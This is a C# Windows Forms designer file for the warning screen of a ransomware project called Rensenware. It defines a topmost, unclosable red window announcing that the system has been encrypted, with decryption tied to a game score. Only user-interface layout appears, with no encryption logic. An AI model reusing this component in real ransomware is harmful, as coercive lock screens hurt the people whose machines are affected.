namespace rensenWare
{
	public partial class frmWarning : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmWarning));
            this.MessageHeader = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.decryptProgress = new System.Windows.Forms.ProgressBar();
            this.DecryptStatus = new System.Windows.Forms.Label();
            this.DecryptStatusLabel = new System.Windows.Forms.Label();
            this.ScoreStatus = new System.Windows.Forms.Label();
            this.ScoreLabel = new System.Windows.Forms.Label();
            this.ProcStatus = new System.Windows.Forms.Label();
            this.StatusLabel = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.ButtonExit = new System.Windows.Forms.Button();
            this.ButtonManualDecrypt = new System.Windows.Forms.Button();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // MessageHeader
            // 
            this.MessageHeader.Font = new System.Drawing.Font("Consolas", 48F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.MessageHeader.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.MessageHeader.Location = new System.Drawing.Point(10, 10);
            this.MessageHeader.Name = "MessageHeader";
            this.MessageHeader.Size = new System.Drawing.Size(493, 86);
            this.MessageHeader.TabIndex = 0;
            this.MessageHeader.Text = "WARNING!";
            this.MessageHeader.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // label1
            // 
            this.label1.Font = new System.Drawing.Font("Consolas", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(20, 95);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(483, 25);
            this.label1.TabIndex = 1;
            this.label1.Text = "Your system have been encrypted by Rensenware!";
            // 
            // label2
            // 
            this.label2.Font = new System.Drawing.Font("Consolas", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(207, 137);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(297, 25);
            this.label2.TabIndex = 1;
            this.label2.Text = "What the HELL is it?";
            // 
            // label3
            // 
            this.label3.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(208, 173);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(295, 102);
            this.label3.TabIndex = 2;
            this.label3.Text = resources.GetString("label3.Text");
            // 
            // label4
            // 
            this.label4.Font = new System.Drawing.Font("Consolas", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(206, 281);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(297, 25);
            this.label4.TabIndex = 1;
            this.label4.Text = "How can I recover my files?";
            // 
            // label5
            // 
            this.label5.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(207, 317);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(295, 99);
            this.label5.TabIndex = 2;
            this.label5.Text = resources.GetString("label5.Text");
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.decryptProgress);
            this.groupBox1.Controls.Add(this.DecryptStatus);
            this.groupBox1.Controls.Add(this.DecryptStatusLabel);
            this.groupBox1.Controls.Add(this.ScoreStatus);
            this.groupBox1.Controls.Add(this.ScoreLabel);
            this.groupBox1.Controls.Add(this.ProcStatus);
            this.groupBox1.Controls.Add(this.StatusLabel);
            this.groupBox1.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox1.Location = new System.Drawing.Point(209, 426);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(293, 154);
            this.groupBox1.TabIndex = 3;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Status";
            // 
            // decryptProgress
            // 
            this.decryptProgress.Location = new System.Drawing.Point(5, 105);
            this.decryptProgress.Name = "decryptProgress";
            this.decryptProgress.Size = new System.Drawing.Size(279, 25);
            this.decryptProgress.TabIndex = 1;
            // 
            // DecryptStatus
            // 
            this.DecryptStatus.Location = new System.Drawing.Point(95, 79);
            this.DecryptStatus.Name = "DecryptStatus";
            this.DecryptStatus.Size = new System.Drawing.Size(189, 16);
            this.DecryptStatus.TabIndex = 0;
            this.DecryptStatus.Text = "Not Approved!";
            // 
            // DecryptStatusLabel
            // 
            this.DecryptStatusLabel.AutoSize = true;
            this.DecryptStatusLabel.Location = new System.Drawing.Point(6, 79);
            this.DecryptStatusLabel.Name = "DecryptStatusLabel";
            this.DecryptStatusLabel.Size = new System.Drawing.Size(98, 15);
            this.DecryptStatusLabel.TabIndex = 0;
            this.DecryptStatusLabel.Text = "Decryption : ";
            // 
            // ScoreStatus
            // 
            this.ScoreStatus.AutoSize = true;
            this.ScoreStatus.Location = new System.Drawing.Point(59, 52);
            this.ScoreStatus.Name = "ScoreStatus";
            this.ScoreStatus.Size = new System.Drawing.Size(119, 15);
            this.ScoreStatus.TabIndex = 0;
            this.ScoreStatus.Text = "TH12 Not Started";
            // 
            // ScoreLabel
            // 
            this.ScoreLabel.AutoSize = true;
            this.ScoreLabel.Location = new System.Drawing.Point(6, 52);
            this.ScoreLabel.Name = "ScoreLabel";
            this.ScoreLabel.Size = new System.Drawing.Size(56, 15);
            this.ScoreLabel.TabIndex = 0;
            this.ScoreLabel.Text = "Score :";
            // 
            // ProcStatus
            // 
            this.ProcStatus.AutoSize = true;
            this.ProcStatus.Location = new System.Drawing.Point(149, 25);
            this.ProcStatus.Name = "ProcStatus";
            this.ProcStatus.Size = new System.Drawing.Size(70, 15);
            this.ProcStatus.TabIndex = 0;
            this.ProcStatus.Text = "Not Found";
            // 
            // StatusLabel
            // 
            this.StatusLabel.AutoSize = true;
            this.StatusLabel.Location = new System.Drawing.Point(6, 25);
            this.StatusLabel.Name = "StatusLabel";
            this.StatusLabel.Size = new System.Drawing.Size(161, 15);
            this.StatusLabel.TabIndex = 0;
            this.StatusLabel.Text = "TH12 Process Status : ";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::rensenWare.Properties.Resources._004a588d52111875951f77e2f97c7afe43481c8ce419a94368c24472bfc5c1ee;
            this.pictureBox1.Location = new System.Drawing.Point(21, 137);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(179, 443);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            // 
            // ButtonExit
            // 
            this.ButtonExit.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ButtonExit.Location = new System.Drawing.Point(351, 588);
            this.ButtonExit.Name = "ButtonExit";
            this.ButtonExit.Size = new System.Drawing.Size(151, 51);
            this.ButtonExit.TabIndex = 7;
            this.ButtonExit.Text = "Exit";
            this.ButtonExit.UseVisualStyleBackColor = true;
            this.ButtonExit.Visible = false;
            this.ButtonExit.Click += new System.EventHandler(this.ButtonExit_Click);
            // 
            // ButtonManualDecrypt
            // 
            this.ButtonManualDecrypt.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ButtonManualDecrypt.Location = new System.Drawing.Point(195, 588);
            this.ButtonManualDecrypt.Name = "ButtonManualDecrypt";
            this.ButtonManualDecrypt.Size = new System.Drawing.Size(151, 51);
            this.ButtonManualDecrypt.TabIndex = 7;
            this.ButtonManualDecrypt.Text = "Manual Decrypter";
            this.ButtonManualDecrypt.UseVisualStyleBackColor = true;
            this.ButtonManualDecrypt.Visible = false;
            this.ButtonManualDecrypt.Click += new System.EventHandler(this.ButtonManualDecrypt_Click);
            // 
            // frmWarning
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Red;
            this.ClientSize = new System.Drawing.Size(495, 633);
            this.ControlBox = false;
            this.Controls.Add(this.ButtonManualDecrypt);
            this.Controls.Add(this.ButtonExit);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.MessageHeader);
            this.DoubleBuffered = true;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "frmWarning";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Rensenware WARNING!";
            this.TopMost = true;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Prevent);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

		}

		private global::System.ComponentModel.IContainer components = null;

		private global::System.Windows.Forms.Label MessageHeader;

		private global::System.Windows.Forms.Label label1;

		private global::System.Windows.Forms.Label label2;

		private global::System.Windows.Forms.Label label3;

		private global::System.Windows.Forms.Label label4;

		private global::System.Windows.Forms.Label label5;

		private global::System.Windows.Forms.GroupBox groupBox1;

		private global::System.Windows.Forms.ProgressBar decryptProgress;

		private global::System.Windows.Forms.Label DecryptStatus;

		private global::System.Windows.Forms.Label DecryptStatusLabel;

		private global::System.Windows.Forms.Label ScoreStatus;

		private global::System.Windows.Forms.Label ScoreLabel;

		private global::System.Windows.Forms.Label ProcStatus;

		private global::System.Windows.Forms.Label StatusLabel;

		private global::System.Windows.Forms.PictureBox pictureBox1;

		private global::System.Windows.Forms.Button ButtonExit;

		private global::System.Windows.Forms.Button ButtonManualDecrypt;
	}
}
